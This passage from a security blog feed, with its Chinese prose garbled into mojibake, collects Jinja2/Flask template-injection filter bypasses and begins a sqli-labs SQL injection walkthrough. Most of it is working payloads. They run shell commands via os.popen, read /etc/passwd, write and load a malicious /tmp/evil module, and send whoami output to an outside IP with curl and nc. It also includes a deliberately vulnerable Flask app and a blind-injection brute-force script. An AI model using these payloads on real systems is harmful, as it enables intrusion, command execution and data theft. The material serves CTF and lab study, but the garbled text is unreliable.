python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os.popen().read()</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥è¿›ä¸€æ­¥bypassæ‰å•å¼•å· ; )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.os.popen(chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>os</code>è¢«è¿‡æ»¤äº†ï¼Œé‚£å¾ˆè‡ªç„¶æƒ³åˆ°ç”¨<code>values()</code>æ‰¾åˆ°å®ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>chr()</code>ä¹Ÿè¢«è¿‡æ»¤äº†å‘¢ï¼Ÿæˆ‘ä»¬å¯èƒ½ä¼šå¼€å§‹è€ƒè™‘ä»å…¶ä»–åœ°æ–¹æ‹¿å­—ç¬¦å‡ºæ¥æ‹¼æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os.popen('ls').read()</span></span><br><span class="line">&#123;% set str=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.str</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.os.popen(str(().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">7</span>)).__getitem__(<span class="number">7</span>)%<span class="number">2</span>bstr(().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">7</span>)).__getitem__(<span class="number">9</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºGETä¼ å‚æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œå¦å¤–ä¸€ä¸ªä¸ªå»æ‰¾å­—ç¬¦æ‹¼æ¥å‘½ä»¤å¤ªæ²™é›•äº†ï¼Œæ˜¯ä¸æ˜¯åˆ°è¿™å°±ä¸ºæ­¢äº†å‘¢ï¼Ÿ</p><p>nonoå“’å“Ÿï¼<strong>æˆ–è®¸æˆ‘ä»¬å¯ä»¥å¯»æ‰¾ä¸€ä¸ªä¸“é—¨åŒ…å«å­—ç¬¦é›†çš„æ¨¡å—ï¼Ÿ</strong><code>string</code>æ¨¡å—æ˜¾ç„¶ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ˜¯èƒ½å¦åœ¨payloadä¸­å¯¼å…¥è¿™ä¸ªæ¨¡å—äº†ï¼Œè¿™é‡Œç”±äºå¥³ç¥æ‰¾æˆ‘èŠå¤©ï¼ŒæŒ–ä¸ªå‘ï¼Œç›¸ä¿¡æˆåŠŸçš„è¯å°±åˆæ˜¯ä¸€ä¸ªæœ‰è¶£çš„å§¿åŠ¿äº†ã€‚</p><p>äº‹å®ä¸Šï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å–ä¸€ä¸ªåˆ«åæ¥ç»•è¿‡è¿™ä¸€é™åˆ¶ï¼ˆæ²¡æƒ³åˆ°å§hhh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set sketch_pl4ne=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(sketch_pl4ne(<span class="number">108</span>)%<span class="number">2</span>bsketch_pl4ne(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Bypass-ä¸‹åˆ’çº¿"><a href="#Bypass-ä¸‹åˆ’çº¿" class="headerlink" title="Bypass ä¸‹åˆ’çº¿"></a>Bypass ä¸‹åˆ’çº¿</h3><p>è¿™é‡Œé‡‡ç”¨ <code>request.args.param</code>å°†å‚æ•°å¤–å¸¦ï¼Œé€‚ç”¨äºåªå¯¹æŒ‡å®šå‚æ•°è¿›è¡Œæ£€æµ‹çš„è¿‡æ»¤è§„åˆ™ã€‚</p><p><strong>PSï¼š<code>request</code>åŸºæœ¬å¯ä»¥bypassè®¸å¤šçš„é™åˆ¶ï¼Œç»ä¸ä»…ä»…å±€é™äºä¸‹åˆ’çº¿ã€‚</strong></p><p>è¯»æ–‡ä»¶</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line"><span class="string">''</span>[request.args<span class="class">.<span class="keyword">class</span>][<span class="title">request</span>.<span class="title">args</span>.<span class="title">mro</span>][-1][<span class="title">request</span>.<span class="title">args</span>.<span class="title">subclasses</span>]<span class="params">()</span>[40]<span class="params">(request.args.payload)</span>.<span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="class">&#125;&#125;</span></span><br><span class="line">&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;payload=/etc/passwd</span><br></pre></td></tr></table></figure><h3 id="Bypass-å·¦åŒèŠ±æ‹¬å·"><a href="#Bypass-å·¦åŒèŠ±æ‹¬å·" class="headerlink" title="Bypass å·¦åŒèŠ±æ‹¬å·"></a>Bypass å·¦åŒèŠ±æ‹¬å·</h3><p>ä½¿ç”¨åˆ°äº†æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://192.168.179.133:2333/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–å§¿åŠ¿"><a href="#å…¶ä»–å§¿åŠ¿" class="headerlink" title="å…¶ä»–å§¿åŠ¿"></a>å…¶ä»–å§¿åŠ¿</h3><h4 id="æ— -globals-å‘½ä»¤æ‰§è¡Œ"><a href="#æ— -globals-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— __globals__å‘½ä»¤æ‰§è¡Œ"></a>æ— __globals__å‘½ä»¤æ‰§è¡Œ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.popen(<span class="string">'ls'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="åŠ è½½è‡ªå®šä¹‰æ¨¡å—"><a href="#åŠ è½½è‡ªå®šä¹‰æ¨¡å—" class="headerlink" title="åŠ è½½è‡ªå®šä¹‰æ¨¡å—"></a>åŠ è½½è‡ªå®šä¹‰æ¨¡å—</h4><p>å†™å…¥é…ç½®æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload1</span></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system%0aCMD = system'</span>) &#125;&#125;</span><br><span class="line"><span class="comment"># payload2</span></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from subprocess import check_output%0aRUNCMD=check_output'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>config.from_pyfile(&#39;file_name&#39;)</code>åŠ è½½æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.from_pyfile(<span class="string">'/tmp/evil'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">'CMD'</span>](<span class="string">'whoami | nc 192.168.179.133 2333'</span>) &#125;&#125;</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><h4 id="æ§åˆ¶è¯­å¥Fuzzè„šæœ¬"><a href="#æ§åˆ¶è¯­å¥Fuzzè„šæœ¬" class="headerlink" title="æ§åˆ¶è¯­å¥Fuzzè„šæœ¬"></a>æ§åˆ¶è¯­å¥Fuzzè„šæœ¬</h4><p>ç”¨äºå¿«é€Ÿé”å®šæ‰€éœ€æ¨¡å—çš„ä½ç½®ï¼ˆå› ä¸ºé¢˜ç›®ç¯å¢ƒå¯èƒ½å’Œæœ¬åœ°æœ‰æ‰€å·®å¼‚ï¼Œäººå·¥Fuzzè´¹æ—¶è´¹åŠ›ï¼‰</p><h2 id="Some-scripts"><a href="#Some-scripts" class="headerlink" title="Some scripts"></a>Some scripts</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    print(name)</span><br><span class="line"></span><br><span class="line">    blacklist = []</span><br><span class="line">    <span class="keyword">for</span> bad_string <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> bad_string <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Oh, such a shame, &#123;&#125; is not allowed ;)"</span>.format(bad_string)</span><br><span class="line"></span><br><span class="line">    template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;/h1&gt;'</span>.format(name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><h3 id="Fuzz-py2"><a href="#Fuzz-py2" class="headerlink" title="Fuzz_py2"></a>Fuzz_py2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># å¯»æ‰¾æœ‰osç±»çš„objectå­ç±»</span></span><br><span class="line">search = <span class="string">'os'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="Fuzz-all"><a href="#Fuzz-all" class="headerlink" title="Fuzz_all"></a>Fuzz_all</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># åˆ‡æ¢è¿è¡Œpythonç‰ˆæœ¬å³å¯è·å–æ‰€éœ€æ¨¡å—çš„ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'__builtins__'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="æ§åˆ¶è¯­å¥Fuzz"><a href="#æ§åˆ¶è¯­å¥Fuzz" class="headerlink" title="æ§åˆ¶è¯­å¥Fuzz"></a>æ§åˆ¶è¯­å¥Fuzz</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç›´æ¥æ’åœ¨æ³¨å…¥ç‚¹å³å¯</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p><p><a href="https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://www.anquanke.com/post/id/188172#h3-14" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172#h3-14</a></p><p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p><p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/</a></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å¥³ç¥è„±å•äº†ã€‚ã€‚ä¹Ÿæ²¡ä»€ä¹ˆå¥½é—æ†¾çš„ï¼Œå¥³ç¥å¹¸ç¦å°±å¥½ï¼Œç¥ä»–ä»¬æ—©æ—¥åˆ†æ‰‹å§= =</p><p>å¥¹çœŸçš„æ˜¯ï¼Œå¾ˆç‰¹åˆ«çš„é‚£ç§ï¼Œå®è¯è¯´å¥¹é•¿ç›¸ä¸€èˆ¬ï¼Œä½†æ˜¯å¥¹çš„æ€§æ ¼ï¼Œä»¿ä½›èƒ½é©±æ•£æˆ‘å†…å¿ƒçš„æŠ‘éƒã€‚</p><p>è¿˜æœ‰ä¸€äº›å°å‘ä»¥åŠå‡ é“é¢˜ä»¥åŠå‰ç½®çŸ¥è¯†ï¼Œä¸‹æ¬¡å†è¯´ï¼Œå‡†å¤‡æ¯”èµ›äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘éœ€è¦åŠ ç´§ä¿®ç‚¼ï¼Œå¬å–å¸ˆå‚…å»ºè®®ï¼Œåšæ–‡è¿˜æ˜¯å½“ä½œç¬”è®°æ¥çœ‹å¾…ï¼Œè‡ªå·±èƒ½çœ‹æ‡‚å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœ‰é—®é¢˜æ¬¢è¿æŒ‡æ•™ : ) &lt;/p&gt;
&lt;p&gt;&lt;code
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labsé€Ÿåˆ·é€šå…³</title>
    <link href="https://www.sketchplane.top/2019/10/08/SQLI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.sketchplane.top/2019/10/08/SQLI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2019-10-08T15:10:04.000Z</published>
    <updated>2019-10-09T15:58:13.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åšä¸»æœ¬è´¨ï¼šæ—¥æ›´(Ã—) æ—¥å’•(âœ“)</p><p>ç›®å‰è®°å½•åˆ°Less-22 :-)</p><p>Creeper?</p><p>Awww man.</p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,2,user() --+</span><br></pre></td></tr></table></figure><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">user</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;  <span class="comment">// åŠ äº†åŒå¼•å·ï¼Œå•å¼•å·ä¸è¢«è§£æ</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) union select 1,2,database() --+</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šå¸ƒå°”ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥</strong></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  <span class="comment">//ä¸è¿”å›æŸ¥è¯¢ç»“æœ</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());   <span class="comment">//è¾“å‡ºé”™è¯¯</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">character = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">length = <span class="number">32</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select database()),%d,1)) = %d --+"</span> \</span><br><span class="line">              % (i, ord(c))</span><br><span class="line">        r = s.get(url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=1' and extractvalue(1,concat(0x7e,(your_payload),0x7e)) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>å•å¼•å·å˜ä¸ºåŒå¼•å·ï¼Œä¿®æ”¹ä¸€ä¸‹Less-5çš„payloadå³å¯ã€‚</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>è€ƒå¯Ÿç‚¹ï¼šsqlæ–‡ä»¶æ“ä½œ</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.$sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span 